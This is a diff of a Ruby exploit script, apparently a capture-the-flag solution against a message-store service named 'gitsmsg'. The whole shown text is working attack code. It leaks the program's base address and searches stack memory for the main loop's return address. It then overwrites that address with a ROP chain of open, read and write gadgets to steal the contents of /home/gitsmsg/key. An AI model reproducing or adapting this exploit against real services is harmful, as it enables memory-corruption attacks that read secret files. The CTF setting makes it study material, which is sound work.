@@ -17,13 +17,30 @@ VARDATA_TYPE_INT_ARRAY    = 0x14
 VARDATA_TYPE_DOUBLE_ARRAY = 0x15
 VARDATA_TYPE_STRING       = 0x16
 
-@@sent = 0
-
 # 10 A's, followed by a null (so it doesn't wind up too long), then pad
 # the rest of the way to 0x100 bytes (the required length)
 DEFAULT_FROM_USERNAME = ("A" * 10) + "\0" + "A" * (0x100 - 11)
 DEFAULT_TO_USERNAME   = ("B" * 10) + "\0" + "B" * (0x100 - 11)
 KEY_PATH              = "/home/gitsmsg/key"
+
+STACK_MIN = 0xBF800000
+STACK_MAX = 0xBFFFFFFF
+
+# This is where the main loop function returns, and therefore what I
+# want to edit on the stack
+MAIN_RETURN_ADDRESS = 0x0e74
+
+# Pop pop pop ret
+PPPR = 0x00002755
+
+# Pop pop ret
+PPR  = 0x00002756
+
+# Pop ret
+PR    = 0x00002757
+OPEN  = 0x00000c90
+READ  = 0x00000b60
+WRITE = 0x00000ce0
 
 def get_int(s, context = "?")
   int = s.recv(4)
@@ -53,7 +70,6 @@ end
 
 # Sends a 0x04 message (store)
 def store(s, vardata_type, vardata, to_username = DEFAULT_TO_USERNAME)
-  @@sent += 1
   out = [MESSAGE_STORE, to_username].pack("Ia*")
 
   if(vardata_type == VARDATA_TYPE_BYTE)
@@ -135,70 +151,68 @@ def hide_data(s, data)
   return result
 end
 
-# We're searching for this
-START_SEARCH   = 0xbf800000
-END_SEARCH     = 0xBFFFFFFF
-CHUNK_SIZE     = END_SEARCH - START_SEARCH
 
-# Pop pop pop ret
-PPPR = 0x00002755
-
-# Pop pop ret
-PPR  = 0x00002756
-
-# Pop ret
-PR   = 0x00002757
-
-def find_return_address(s, address_to_find)
-  address_to_find = [address_to_find].pack("I")
+def find_return_address(s, base_addr)
+  address_to_find = [base_addr + MAIN_RETURN_ADDRESS].pack("I")
 
   store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)
   store(s, VARDATA_TYPE_INT_ARRAY, [0x41414141] * 0xf0)
 
-  puts("Trying to read 0x%08x - 0x%08x..." % [START_SEARCH, END_SEARCH])
-  edit_array(s, 1, 3, [START_SEARCH, CHUNK_SIZE / 4].pack("II"))
+  puts("Reading the stack (0x%08x - 0x%08x)..." % [STACK_MIN, STACK_MAX])
+  edit_array(s, 1, 3, [STACK_MIN, (STACK_MAX - STACK_MIN) / 4].pack("II"))
 
+  # We have to re-implement "get" here, so we can handle a large buffer and
+  # quit when we find what we need
   out = [MESSAGE_GET, 0].pack("II")
   s.write(out)
   get_int(s) # type (don't care)
   len = get_int(s)
-  puts("Retrieving #{len} bytes")
   result = ""
 
+  # Loop and read
   while(result.length < len)
-    result = result + s.recv(END_SEARCH - START_SEARCH + 1)
+    result = result + s.recv(STACK_MAX - STACK_MIN + 1)
+
+    # As soon as we find the location, end
     if(loc = result.index(address_to_find))
-      return START_SEARCH + loc
+      return STACK_MIN + loc
     end
   end
 
+  # D'awww :(
   puts("Couldn't find the return address :(")
   exit
 end
 
-def change_return_address(s, return_address, file_path, base, fd)
+def get_rop(file_path, base_addr, fd)
+    stack = [
+      base_addr + OPEN,  # open()
+      base_addr + PPR,   # pop/pop/ret
+      file_path,         # filename = value we created
+      0,                 # flags
+
+      base_addr + READ,  # read()
+      base_addr + PPPR,  # pop/pop/pop/ret
+      0,                 # fd
+      file_path,         # buf
+      100,               # count
+
+      base_addr + WRITE, # write()
+      base_addr + PPPR,  # pop/pop/pop/ret
+      fd,                # fd
+      file_path,         # buf
+      100,               # count
+
+      # This was simply for testing, it sends 4 bytes then exits
+      base_addr + 0x2350
+    ]
+
+    return stack
+end
+
+def change_return_address(s, return_address, stack)
 
     puts("Attempting to ROP-read the key file...")
-    stack = [
-      base+0xc90, # open()
-      base+PPR,        # open return addr
-      file_path,  # filename = value we created
-      0,          # flags
-
-      base+0xb60, # read()
-      base+PPPR,
-      0,          # fd
-      file_path,  # buf
-      100,        # count
-
-      base+0xce0, # write()
-      base+PPPR,
-      fd,         # fd
-      file_path,  # buf
-      100,        # count
-
-      base+0x2350
-    ]
 
     0.upto(stack.size - 1) do |i|
       entry = [stack[i]].pack("I")
@@ -235,31 +249,35 @@ receive_code(s, 0x00001000, "init")
 puts("** Logging in")
 login(s)
 
+# We add a bunch of NULL bytes to the path to clear the buffer,
+# which makes it prettier to display later
 puts("** Stashing a path to the file on the heap")
-file_path = hide_data(s, "/home/gitsmsg/key\0" + ("A"*100))
+file_path = hide_data(s, KEY_PATH + ("\0" * 100))
 
+puts("** Using a memory leak to get the base address")
 base_addr = get_base_address(s)
-puts("Found base address = 0x%08x" % base_addr)
+puts("... found it @ 0x%08x!" % base_addr)
 
-puts("Retrieving the file descriptor from memory")
+puts("** Reading the file descriptor from memory")
 fd = get_fd(s, base_addr)
 puts("... it's #{fd}!")
 
-address_to_overwrite = base_addr + 0x0e74
-puts("Searching the stack for 0x%08x" % address_to_overwrite)
+puts("** Searching stack memory for the return address")
+return_address = find_return_address(s, base_addr)
+puts("... found it @ 0x%08x" % return_address)
 
-return_address = find_return_address(s, address_to_overwrite)
-puts("Found return address @ 0x%08x" % return_address)
+puts("** Generating the ROP chain")
+stack = get_rop(file_path, base_addr, fd)
 
-change_return_address(s, return_address, file_path, base_addr, fd)
+puts("** Changing the return address")
+change_return_address(s, return_address, stack)
 
-puts("Quitting")
+puts("** Sending a 'quit' message, to trigger the payload")
 quit(s)
 
-loop do
+puts("** Crossing our fingers and waiting for the password")
   a = s.recv(100)
   if(a.nil? || a == "")
     exit
   end
   puts(a)
-end
